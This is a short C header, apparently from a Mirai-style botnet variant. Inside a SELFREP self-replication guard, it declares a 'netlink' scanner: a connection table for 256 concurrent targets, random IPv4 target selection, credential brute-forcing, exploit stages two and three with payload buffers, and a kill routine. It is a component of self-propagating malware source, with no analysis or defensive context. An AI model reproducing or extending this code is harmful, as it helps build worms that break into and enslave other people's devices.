#ifdef SELFREP

#pragma once

#include <stdint.h>

#include "includes.h"

#define netlink_SCANNER_MAX_CONNS   256
#define netlink_SCANNER_RAW_PPS     1024

#define netlink_SCANNER_RDBUF_SIZE  1080
#define netlink_SCANNER_HACK_DRAIN  64

struct netlink_scanner_connection
{
    int fd, last_recv;
    enum
    {
        netlink_SC_CLOSED,
        netlink_netlink_SC_CONNECTING,
        netlink_SC_GET_CREDENTIALS,
        netlink_SC_EXPLOIT_STAGE2,
        netlink_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[netlink_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[256], payload_buf2[256];
    int credential_index;
};

void netlink_scanner();
void netlink_kill(void);

static void netlink_setup_connection(struct netlink_scanner_connection *);
static ipv4_t get_random_netlink_ip(void);

#endif
